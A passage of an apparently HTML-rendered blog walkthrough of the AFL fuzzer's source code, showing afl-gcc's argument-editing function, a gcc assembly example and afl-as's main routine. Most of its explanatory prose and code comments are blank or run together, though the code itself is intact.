class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Copy argv to cc_params, making the necessary edits. */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">edit_params</span><span class="params">(u32 argc, <span class="type">char</span>** argv)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  u8 fortify_set = <span class="number">0</span>, asan_set = <span class="number">0</span>;</span><br><span class="line">  u8 *name;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(__FreeBSD__) &amp;&amp; defined(__x86_64__)</span></span><br><span class="line">  u8 m32_set = <span class="number">0</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  cc_params = <span class="built_in">ck_alloc</span>((argc + <span class="number">128</span>) * <span class="built_in">sizeof</span>(u8*));</span><br><span class="line"></span><br><span class="line">  name = <span class="built_in">strrchr</span>(argv[<span class="number">0</span>], <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">  <span class="keyword">if</span> (!name) name = argv[<span class="number">0</span>]; <span class="keyword">else</span> name++;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// </span></span><br><span class="line">  <span class="comment">// afl-clang clang</span></span><br><span class="line">  <span class="comment">// alf-clang++</span></span><br><span class="line">  <span class="comment">// more: afl-clang-fast llvm mode </span></span><br><span class="line">  <span class="keyword">if</span> (!<span class="built_in">strncmp</span>(name, <span class="string">&quot;afl-clang&quot;</span>, <span class="number">9</span>)) &#123;</span><br><span class="line"></span><br><span class="line">    clang_mode = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">setenv</span>(CLANG_ENV_VAR, <span class="string">&quot;1&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(name, <span class="string">&quot;afl-clang++&quot;</span>)) &#123;</span><br><span class="line">      u8* alt_cxx = <span class="built_in">getenv</span>(<span class="string">&quot;AFL_CXX&quot;</span>);</span><br><span class="line">      cc_params[<span class="number">0</span>] = alt_cxx ? alt_cxx : (u8*)<span class="string">&quot;clang++&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      u8* alt_cc = <span class="built_in">getenv</span>(<span class="string">&quot;AFL_CC&quot;</span>);</span><br><span class="line">      cc_params[<span class="number">0</span>] = alt_cc ? alt_cc : (u8*)<span class="string">&quot;clang&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;    <span class="comment">// else  afl-gcc</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* With GCJ and Eclipse installed, you can actually compile Java! The</span></span><br><span class="line"><span class="comment">       instrumentation will work (amazingly). Alas, unhandled exceptions do</span></span><br><span class="line"><span class="comment">       not call abort(), so afl-fuzz would need to be modified to equate</span></span><br><span class="line"><span class="comment">       non-zero exit codes with crash conditions when working with Java</span></span><br><span class="line"><span class="comment">       binaries. Meh. */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __APPLE__</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(name, <span class="string">&quot;afl-g++&quot;</span>)) cc_params[<span class="number">0</span>] = <span class="built_in">getenv</span>(<span class="string">&quot;AFL_CXX&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(name, <span class="string">&quot;afl-gcj&quot;</span>)) cc_params[<span class="number">0</span>] = <span class="built_in">getenv</span>(<span class="string">&quot;AFL_GCJ&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> cc_params[<span class="number">0</span>] = <span class="built_in">getenv</span>(<span class="string">&quot;AFL_CC&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!cc_params[<span class="number">0</span>]) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="built_in">SAYF</span>(<span class="string">&quot;\n&quot;</span> cLRD <span class="string">&quot;[-] &quot;</span> cRST</span><br><span class="line">           <span class="string">&quot;On Apple systems, &#x27;gcc&#x27; is usually just a wrapper for clang. Please use the\n&quot;</span></span><br><span class="line">           <span class="string">&quot;    &#x27;afl-clang&#x27; utility instead of &#x27;afl-gcc&#x27;. If you really have GCC installed,\n&quot;</span></span><br><span class="line">           <span class="string">&quot;    set AFL_CC or AFL_CXX to specify the correct path to that compiler.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">      <span class="built_in">FATAL</span>(<span class="string">&quot;AFL_CC or AFL_CXX required on MacOS X&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(name, <span class="string">&quot;afl-g++&quot;</span>)) &#123;</span><br><span class="line">      u8* alt_cxx = <span class="built_in">getenv</span>(<span class="string">&quot;AFL_CXX&quot;</span>);</span><br><span class="line">      cc_params[<span class="number">0</span>] = alt_cxx ? alt_cxx : (u8*)<span class="string">&quot;g++&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(name, <span class="string">&quot;afl-gcj&quot;</span>)) &#123;</span><br><span class="line">      u8* alt_cc = <span class="built_in">getenv</span>(<span class="string">&quot;AFL_GCJ&quot;</span>);</span><br><span class="line">      cc_params[<span class="number">0</span>] = alt_cc ? alt_cc : (u8*)<span class="string">&quot;gcj&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      u8* alt_cc = <span class="built_in">getenv</span>(<span class="string">&quot;AFL_CC&quot;</span>);</span><br><span class="line">      cc_params[<span class="number">0</span>] = alt_cc ? alt_cc : (u8*)<span class="string">&quot;gcc&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* __APPLE__ */</span></span></span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// </span></span><br><span class="line">  <span class="keyword">while</span> (--argc) &#123;</span><br><span class="line">    u8* cur = *(++argv);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strncmp</span>(cur, <span class="string">&quot;-B&quot;</span>, <span class="number">2</span>)) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (!be_quiet) <span class="built_in">WARNF</span>(<span class="string">&quot;-B is already set, overriding&quot;</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (!cur[<span class="number">2</span>] &amp;&amp; argc &gt; <span class="number">1</span>) &#123; argc--; argv++; &#125;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(cur, <span class="string">&quot;-integrated-as&quot;</span>)) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(cur, <span class="string">&quot;-pipe&quot;</span>)) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(__FreeBSD__) &amp;&amp; defined(__x86_64__)</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(cur, <span class="string">&quot;-m32&quot;</span>)) m32_set = <span class="number">1</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(cur, <span class="string">&quot;-fsanitize=address&quot;</span>) ||</span><br><span class="line">        !<span class="built_in">strcmp</span>(cur, <span class="string">&quot;-fsanitize=memory&quot;</span>)) asan_set = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strstr</span>(cur, <span class="string">&quot;FORTIFY_SOURCE&quot;</span>)) fortify_set = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    cc_params[cc_par_cnt++] = cur;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// -B  as_path</span></span><br><span class="line">  cc_params[cc_par_cnt++] = <span class="string">&quot;-B&quot;</span>;</span><br><span class="line">  cc_params[cc_par_cnt++] = as_path;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// clang mode flag</span></span><br><span class="line">  <span class="keyword">if</span> (clang_mode)</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-no-integrated-as&quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// AFL_HARDEN </span></span><br><span class="line">  <span class="comment">// stack canary</span></span><br><span class="line">  <span class="comment">// </span></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_HARDEN&quot;</span>)) &#123;</span><br><span class="line"></span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-fstack-protector-all&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!fortify_set)</span><br><span class="line">      cc_params[cc_par_cnt++] = <span class="string">&quot;-D_FORTIFY_SOURCE=2&quot;</span>;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// </span></span><br><span class="line">  <span class="comment">// ASan  (use-after-free)(double-free)</span></span><br><span class="line">  <span class="comment">// (buffer overflows)(underflows) </span></span><br><span class="line">  <span class="keyword">if</span> (asan_set) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Pass this on to afl-as to adjust map density. */</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">setenv</span>(<span class="string">&quot;AFL_USE_ASAN&quot;</span>, <span class="string">&quot;1&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_USE_ASAN&quot;</span>)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_USE_MSAN&quot;</span>))</span><br><span class="line">      <span class="built_in">FATAL</span>(<span class="string">&quot;ASAN and MSAN are mutually exclusive&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_HARDEN&quot;</span>))</span><br><span class="line">      <span class="built_in">FATAL</span>(<span class="string">&quot;ASAN and AFL_HARDEN are mutually exclusive&quot;</span>);</span><br><span class="line"></span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-U_FORTIFY_SOURCE&quot;</span>;</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-fsanitize=address&quot;</span>;</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_USE_MSAN&quot;</span>)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_USE_ASAN&quot;</span>))</span><br><span class="line">      <span class="built_in">FATAL</span>(<span class="string">&quot;ASAN and MSAN are mutually exclusive&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_HARDEN&quot;</span>))</span><br><span class="line">      <span class="built_in">FATAL</span>(<span class="string">&quot;MSAN and AFL_HARDEN are mutually exclusive&quot;</span>);</span><br><span class="line"></span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-U_FORTIFY_SOURCE&quot;</span>;</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-fsanitize=memory&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// AFL_DONT_OPTIMIZE</span></span><br><span class="line">  <span class="keyword">if</span> (!<span class="built_in">getenv</span>(<span class="string">&quot;AFL_DONT_OPTIMIZE&quot;</span>)) &#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(__FreeBSD__) &amp;&amp; defined(__x86_64__)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* On 64-bit FreeBSD systems, clang -g -m32 is broken, but -m32 itself</span></span><br><span class="line"><span class="comment">       works OK. This has nothing to do with us, but let&#x27;s avoid triggering</span></span><br><span class="line"><span class="comment">       that bug. */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!clang_mode || !m32_set)</span><br><span class="line">      cc_params[cc_par_cnt++] = <span class="string">&quot;-g&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"></span><br><span class="line">      cc_params[cc_par_cnt++] = <span class="string">&quot;-g&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-O3&quot;</span>;</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-funroll-loops&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Two indicators that you&#x27;re building for fuzzing; one of them is</span></span><br><span class="line"><span class="comment">       AFL-specific, the other is shared with libfuzzer. */</span></span><br><span class="line"></span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-D__AFL_COMPILER=1&quot;</span>;</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-DFUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION=1&quot;</span>;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// </span></span><br><span class="line">  <span class="comment">// </span></span><br><span class="line">  <span class="comment">// -fno-builtin</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_NO_BUILTIN&quot;</span>)) &#123;</span><br><span class="line"></span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-fno-builtin-strcmp&quot;</span>;</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-fno-builtin-strncmp&quot;</span>;</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-fno-builtin-strcasecmp&quot;</span>;</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-fno-builtin-strncasecmp&quot;</span>;</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-fno-builtin-memcmp&quot;</span>;</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-fno-builtin-strstr&quot;</span>;</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-fno-builtin-strcasestr&quot;</span>;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  cc_params[cc_par_cnt] = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>gccc <code></code></p><h2 id="afl-as-"><a href="#afl-as-" class="headerlink" title="afl-as "></a>afl-as </h2><p>-B  Add &lt;directory&gt; to the compilers search paths</p><p>C</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">$ gcc tmp.c -S tmp.S -O0 -fno-asynchronous-unwind-tables</span><br><span class="line">cc1: warning: tmp.S is shorter than expected</span><br><span class="line"><span class="comment"># 0 &quot;tmp.S&quot;</span></span><br><span class="line"><span class="comment"># 0 &quot;&lt;built-in&gt;&quot;</span></span><br><span class="line"><span class="comment"># 0 &quot;&lt;command-line&gt;&quot;</span></span><br><span class="line"><span class="comment"># 1 &quot;/usr/include/stdc-predef.h&quot; 1 3 4</span></span><br><span class="line"><span class="comment"># 0 &quot;&lt;command-line&gt;&quot; 2</span></span><br><span class="line"><span class="comment"># 1 &quot;tmp.S&quot;</span></span><br><span class="line"> .file <span class="string">&quot;tmp.c&quot;</span></span><br><span class="line"> .text</span><br><span class="line"> .section .rodata</span><br><span class="line">.LC0:</span><br><span class="line"> .string <span class="string">&quot;hello&quot;</span></span><br><span class="line"> .text</span><br><span class="line"> .globl main</span><br><span class="line"> .<span class="built_in">type</span> main, @<span class="keyword">function</span></span><br><span class="line">main:</span><br><span class="line"> pushq %rbp</span><br><span class="line"> movq %rsp, %rbp</span><br><span class="line"> leaq .LC0(%rip), %rax</span><br><span class="line"> movq %rax, %rdi</span><br><span class="line"> movl <span class="variable">$0</span>, %eax</span><br><span class="line"> call <span class="built_in">printf</span>@PLT</span><br><span class="line"> movl <span class="variable">$0</span>, %eax</span><br><span class="line"> popq %rbp</span><br><span class="line"> ret</span><br><span class="line"> .size main, .-main</span><br><span class="line"> .ident <span class="string">&quot;GCC: (Debian 13.2.0-13) 13.2.0&quot;</span></span><br><span class="line"> .section .note.GNU-stack,<span class="string">&quot;&quot;</span>,@progbits</span><br></pre></td></tr></table></figure><p></p><p>afl-clangafl-gcc</p><ul><li>llvm-mode</li></ul><h3 id="main-1"><a href="#main-1" class="headerlink" title="main"></a>main</h3><p>afl-asafl-gcc</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  s32 pid;</span><br><span class="line">  u32 rand_seed;</span><br><span class="line">  <span class="type">int</span> status;</span><br><span class="line">  u8* inst_ratio_str = <span class="built_in">getenv</span>(<span class="string">&quot;AFL_INST_RATIO&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">timeval</span> tv;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">timezone</span> tz;</span><br><span class="line"></span><br><span class="line">  clang_mode = !!<span class="built_in">getenv</span>(CLANG_ENV_VAR);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">isatty</span>(<span class="number">2</span>) &amp;&amp; !<span class="built_in">getenv</span>(<span class="string">&quot;AFL_QUIET&quot;</span>)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">SAYF</span>(cCYA <span class="string">&quot;afl-as &quot;</span> cBRI VERSION cRST <span class="string">&quot; by &lt;lcamtuf@google.com&gt;\n&quot;</span>);</span><br><span class="line"> </span><br><span class="line">  &#125; <span class="keyword">else</span> be_quiet = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (argc &lt; <span class="number">2</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">SAYF</span>(<span class="string">&quot;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;This is a helper application for afl-fuzz. It is a wrapper around GNU &#x27;as&#x27;,\n&quot;</span></span><br><span class="line">         <span class="string">&quot;executed by the toolchain whenever using afl-gcc or afl-clang. You probably\n&quot;</span></span><br><span class="line">         <span class="string">&quot;don&#x27;t want to run this program directly.\n\n&quot;</span></span><br><span class="line"></span><br><span class="line">         <span class="string">&quot;Rarely, when dealing with extremely complex projects, it may be advisable to\n&quot;</span></span><br><span class="line">         <span class="string">&quot;set AFL_INST_RATIO to a value less than 100 in order to reduce the odds of\n&quot;</span></span><br><span class="line">         <span class="string">&quot;instrumenting every discovered branch.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// </span></span><br><span class="line">  <span class="built_in">gettimeofday</span>(&amp;tv, &amp;tz);</span><br><span class="line"></span><br><span class="line">  rand_seed = tv.tv_sec ^ tv.tv_usec ^ <span class="built_in">getpid</span>();</span><br><span class="line"></span><br><span class="line">  <span class="built_in">srandom</span>(rand_seed);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// </span></span><br><span class="line">  <span class="built_in">edit_params</span>(argc, argv);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (inst_ratio_str) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">sscanf</span>(inst_ratio_str, <span class="string">&quot;%u&quot;</span>, &amp;inst_ratio) != <span class="number">1</span> || inst_ratio &gt; <span class="number">100</span>) </span><br><span class="line">      <span class="built_in">FATAL</span>(<span class="string">&quot;Bad value of AFL_INST_RATIO (must be between 0 and 100)&quot;</span>);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">getenv</span>(AS_LOOP_ENV_VAR))</span><br><span class="line">    <span class="built_in">FATAL</span>(<span class="string">&quot;Endless loop when calling &#x27;as&#x27; (remove &#x27;.&#x27; from your PATH)&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">setenv</span>(AS_LOOP_ENV_VAR, <span class="string">&quot;1&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* When compiling with ASAN, we don&#x27;t have a particularly elegant way to skip</span></span><br><span class="line"><span class="comment">     ASAN-specific branches. But we can probabilistically compensate for</span></span><br><span class="line"><span class="comment">     that... */</span></span><br><span class="line">  <span class="comment">// </span></span><br><span class="line">  <span class="comment">// ASANAFLASAN/3</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_USE_ASAN&quot;</span>) || <span class="built_in">getenv</span>(<span class="string">&quot;AFL_USE_MSAN&quot;</span>)) &#123;</span><br><span class="line">    sanitizer = <span class="number">1</span>;</span><br><span class="line">    inst_ratio /= <span class="number">3</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// </span></span><br><span class="line">  <span class="keyword">if</span> (!just_version) <span class="built_in">add_instrumentation</span>();</span><br><span class="line"></span><br><span class="line">  <span class="comment">//  afl-as</span></span><br><span class="line">  <span class="keyword">if</span> (!(pid = fork())) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">execvp</span>(as_params[<span class="number">0</span>], (<span class="type">char</span>**)as_params);</span><br><span class="line">    <span class="built_in">FATAL</span>(<span class="string">&quot;Oops, failed to execute &#x27;%s&#x27; - check your PATH&quot;</span>, as_params[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (pid &lt; <span class="number">0</span>) <span class="built_in">PFATAL</span>(<span class="string">&quot;fork() failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">waitpid</span>(pid, &amp;status, <span class="number">0</span>) &lt;= <span class="number">0</span>) <span class="built_in">PFATAL</span>(<span class="string">&quot;waitpid() failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// .S</span></span><br><span class="line">  <span class="keyword">if</span> (!<span class="built_in">getenv</span>(<span class="string">&quot;AFL_KEEP_ASSEMBLY&quot;</span>)) <span class="built_in">unlink</span>(modified_file);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">exit</span>(<span class="built_in">WEXITSTATUS</span>(status));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="edit-param-1"><a href="#edit-param-1" class="headerlink" title="edit param"></a>edit param</h3><p>afl-as afl-gcc </p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span 